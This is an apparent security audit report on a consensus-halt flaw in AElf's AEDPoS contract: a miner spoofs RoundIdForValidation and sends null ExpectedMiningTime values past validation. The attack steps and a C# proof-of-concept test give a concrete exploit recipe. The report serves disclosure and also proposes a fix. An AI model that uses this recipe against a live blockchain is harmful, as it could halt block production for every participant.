# Audit Report

## Title
Consensus Halt via Null ExpectedMiningTime Validation Bypass in AEDPoS Round Transitions

## Summary
A malicious miner can bypass the `CheckRoundTimeSlots()` validation by manipulating `RoundIdForValidation` to match the current round's `RoundId`, allowing storage of a Round object with null `ExpectedMiningTime` fields. This causes `NullReferenceException` crashes in critical consensus paths (`GetConsensusCommand()` and `IsCurrentMiner()`), halting all block production network-wide.

## Finding Description

The vulnerability exists due to a validation bypass in the consensus round transition flow. The `GetExtraBlockMiningTime()` method directly dereferences `ExpectedMiningTime` without null checking: [1](#0-0) 

While `CheckRoundTimeSlots()` validates for null `ExpectedMiningTime`: [2](#0-1) 

This validation is only invoked conditionally in `TimeSlotValidationProvider` based on `RoundId` comparison: [3](#0-2) 

The critical flaw is that `RoundId` property has fallback logic when `ExpectedMiningTime` is null: [4](#0-3) 

**Attack Execution:**

1. Malicious miner creates `NextRoundInput` with:
   - `RoundNumber = currentRound.RoundNumber + 1` (passes `RoundTerminateValidationProvider`)
   - All `ExpectedMiningTime = null`
   - `RoundIdForValidation = currentRound.RoundId` (manipulated value)

2. During `ValidateBeforeExecution()`, the `TimeSlotValidationProvider` compares `ProvidedRound.RoundId` vs `BaseRound.RoundId`. Since `ProvidedRound.RoundId` returns `RoundIdForValidation` (due to null fields), and this equals `BaseRound.RoundId`, the condition on line 14 is FALSE, bypassing `CheckRoundTimeSlots()`. [5](#0-4) 

3. The malicious Round is stored via `ProcessNextRound()`: [6](#0-5) 

4. When miners attempt to produce blocks, `ConsensusBehaviourProviderBase` constructor calls `IsTimeSlotPassed()`: [7](#0-6) 

Which dereferences null `ExpectedMiningTime`: [8](#0-7) 

Additionally, `IsCurrentMiner()` calls `GetExtraBlockMiningTime()` causing the same crash: [9](#0-8) 

## Impact Explanation

**High Severity - Complete Consensus Halt:**

- `GetConsensusCommand()` is the entry point for ALL block production in AEDPoS. When this method throws `NullReferenceException`, no miner can obtain consensus commands.
- The crash occurs in `ConsensusBehaviourProviderBase` constructor, affecting all consensus behaviors (UpdateValue, TinyBlock, NextRound, NextTerm).
- The malicious Round persists in state (`State.Rounds[roundNumber]`) until manual intervention.
- All network participants are affected simultaneously when the malicious round becomes current.
- Extra block producers cannot be determined, preventing round termination.
- Network requires hard fork or emergency contract upgrade to recover.

## Likelihood Explanation

**Medium Likelihood:**

**Attacker Requirements:**
- Must be an active miner in `currentRound.RealTimeMinersInformation` (granted by election/genesis)
- Can generate consensus extra data (standard capability for all miners)
- Can manipulate protobuf serialization to omit `ExpectedMiningTime` fields (proto3 allows null message fields)

**Attack Feasibility:**
- The bypass is non-obvious but technically straightforward: set `RoundIdForValidation` to current `RoundId` value
- No cryptographic requirements beyond standard block signing
- The validation logic explicitly allows the bypass through the RoundId comparison mechanism

**Detection:**
- Immediate: `NullReferenceException` appears in node logs when next miner calls `GetConsensusCommand()`
- However, damage is already done as malicious Round is in state

**Mitigating Factors:**
- Requires miner status (limited attacker pool)
- Single-use attack (network learns to blacklist attacker)
- Traceable on-chain (attacker's public key in block)

## Recommendation

Add explicit null validation before RoundId comparison in `TimeSlotValidationProvider`:

```csharp
public ValidationResult ValidateHeaderInformation(ConsensusValidationContext validationContext)
{
    var validationResult = new ValidationResult();
    
    // If provided round is a new round
    if (validationContext.ProvidedRound.RoundId != validationContext.BaseRound.RoundId)
    {
        // ALWAYS validate time slots for new rounds, regardless of RoundId
        validationResult = validationContext.ProvidedRound.CheckRoundTimeSlots();
        if (!validationResult.Success) return validationResult;
    }
    else
    {
        // For same-round updates, ALSO check if this is actually a NextRound/NextTerm
        // by comparing RoundNumber - if different, must validate time slots
        if (validationContext.ProvidedRound.RoundNumber != validationContext.BaseRound.RoundNumber)
        {
            validationResult = validationContext.ProvidedRound.CheckRoundTimeSlots();
            if (!validationResult.Success) return validationResult;
        }
        
        // Existing time slot check
        if (!CheckMinerTimeSlot(validationContext))
        {
            validationResult.Message = $"Time slot already passed before execution.{validationContext.SenderPubkey}";
            validationResult.IsReTrigger = true;
            return validationResult;
        }
    }

    validationResult.Success = true;
    return validationResult;
}
```

Alternatively, add null checks directly in `GetExtraBlockMiningTime()` and `IsTimeSlotPassed()`, but the validation fix is more comprehensive.

## Proof of Concept

```csharp
[Fact]
public async Task ConsensusHalt_NullExpectedMiningTime_Attack()
{
    // Setup: Initialize chain with miners
    var miners = await InitializeMinersAsync();
    var maliciousMiner = miners[0];
    
    // Get current round
    var currentRound = await GetCurrentRoundInformationAsync();
    var currentRoundId = currentRound.RoundId;
    
    // Create malicious NextRoundInput
    var maliciousInput = new NextRoundInput
    {
        RoundNumber = currentRound.RoundNumber + 1,
        TermNumber = currentRound.TermNumber,
        RoundIdForValidation = currentRoundId, // Bypass key: match current
        RealTimeMinersInformation = { }
    };
    
    // Add miners with NULL ExpectedMiningTime
    foreach (var miner in currentRound.RealTimeMinersInformation)
    {
        maliciousInput.RealTimeMinersInformation.Add(miner.Key, new MinerInRound
        {
            Pubkey = miner.Value.Pubkey,
            Order = miner.Value.Order,
            ExpectedMiningTime = null, // Malicious null value
            IsExtraBlockProducer = miner.Value.IsExtraBlockProducer
        });
    }
    
    // Execute attack: Submit NextRound with malicious data
    var result = await ExecuteConsensusTransactionAsync(maliciousMiner, maliciousInput);
    
    // Verify malicious round stored
    result.Status.ShouldBe(TransactionResultStatus.Mined);
    var storedRound = await GetRoundInformationAsync(maliciousInput.RoundNumber);
    storedRound.RoundNumber.ShouldBe(maliciousInput.RoundNumber);
    
    // Trigger consensus halt: Any miner tries to get consensus command
    var exception = await Assert.ThrowsAsync<NullReferenceException>(async () =>
    {
        await ConsensusContract.GetConsensusCommand.CallAsync(
            new BytesValue { Value = ByteString.CopyFrom(miners[1].PublicKey) });
    });
    
    // Verify consensus is halted - no miner can produce blocks
    exception.ShouldNotBeNull();
    exception.Message.ShouldContain("ExpectedMiningTime");
}
```

### Citations

**File:** contract/AElf.Contracts.Consensus.AEDPoS/Types/Round.cs (L19-22)
```csharp
            if (RealTimeMinersInformation.Values.All(bpInfo => bpInfo.ExpectedMiningTime != null))
                return RealTimeMinersInformation.Values.Select(bpInfo => bpInfo.ExpectedMiningTime.Seconds).Sum();

            return RoundIdForValidation;
```

**File:** contract/AElf.Contracts.Consensus.AEDPoS/Types/Round.cs (L40-41)
```csharp
        if (miners.Any(m => m.ExpectedMiningTime == null))
            return new ValidationResult { Message = $"Incorrect expected mining time.\n{this}" };
```

**File:** contract/AElf.Contracts.Consensus.AEDPoS/Types/Round.cs (L89-90)
```csharp
            return minerInRound.ExpectedMiningTime + new Duration { Seconds = miningInterval.Div(1000) } <
                   currentBlockTime;
```

**File:** contract/AElf.Contracts.Consensus.AEDPoS/Types/Round.cs (L117-122)
```csharp
    public Timestamp GetExtraBlockMiningTime()
    {
        return RealTimeMinersInformation.OrderBy(m => m.Value.Order).Last().Value
            .ExpectedMiningTime
            .AddMilliseconds(GetMiningInterval());
    }
```

**File:** contract/AElf.Contracts.Consensus.AEDPoS/ConsensusHeaderInfoValidationProviders/TimeSlotValidationProvider.cs (L14-18)
```csharp
        if (validationContext.ProvidedRound.RoundId != validationContext.BaseRound.RoundId)
        {
            // Is new round information fits time slot rule?
            validationResult = validationContext.ProvidedRound.CheckRoundTimeSlots();
            if (!validationResult.Success) return validationResult;
```

**File:** contract/AElf.Contracts.Consensus.AEDPoS/ConsensusHeaderInfoValidationProviders/RoundTerminateValidationProvider.cs (L29-30)
```csharp
        if (validationContext.BaseRound.RoundNumber.Add(1) != extraData.Round.RoundNumber)
            return new ValidationResult { Message = "Incorrect round number for next round." };
```

**File:** contract/AElf.Contracts.Consensus.AEDPoS/AEDPoSContract_ProcessConsensusInformation.cs (L110-156)
```csharp
        var nextRound = input.ToRound();
        
        RecordMinedMinerListOfCurrentRound();

        TryToGetCurrentRoundInformation(out var currentRound);

        // Do some other stuff during the first time to change round.
        if (currentRound.RoundNumber == 1)
        {
            // Set blockchain start timestamp.
            var actualBlockchainStartTimestamp =
                currentRound.FirstActualMiner()?.ActualMiningTimes.FirstOrDefault() ??
                Context.CurrentBlockTime;
            SetBlockchainStartTimestamp(actualBlockchainStartTimestamp);

            // Initialize current miners' information in Election Contract.
            if (State.IsMainChain.Value)
            {
                var minersCount = GetMinersCount(nextRound);
                if (minersCount != 0 && State.ElectionContract.Value != null)
                {
                    State.ElectionContract.UpdateMinersCount.Send(new UpdateMinersCountInput
                    {
                        MinersCount = minersCount
                    });
                }
            }
        }

        if (State.IsMainChain.Value && // Only detect evil miners in Main Chain.
            currentRound.TryToDetectEvilMiners(out var evilMiners))
        {
            Context.LogDebug(() => "Evil miners detected.");
            foreach (var evilMiner in evilMiners)
            {
                Context.LogDebug(() =>
                    $"Evil miner {evilMiner}, missed time slots: {currentRound.RealTimeMinersInformation[evilMiner].MissedTimeSlots}.");
                // Mark these evil miners.
                State.ElectionContract.UpdateCandidateInformation.Send(new UpdateCandidateInformationInput
                {
                    Pubkey = evilMiner,
                    IsEvilNode = true
                });
            }
        }

        AddRoundInformation(nextRound);
```

**File:** contract/AElf.Contracts.Consensus.AEDPoS/ConsensusCommandGeneration/ConsensusBehaviourProviderBase.cs (L35-36)
```csharp
            _isTimeSlotPassed = CurrentRound.IsTimeSlotPassed(_pubkey, _currentBlockTime);
            _minerInRound = CurrentRound.RealTimeMinersInformation[_pubkey];
```

**File:** contract/AElf.Contracts.Consensus.AEDPoS/AEDPoSContract_ViewMethods.cs (L173-174)
```csharp
        if (Context.CurrentBlockTime >= currentRound.GetExtraBlockMiningTime() &&
            supposedExtraBlockProducer == pubkey)
```
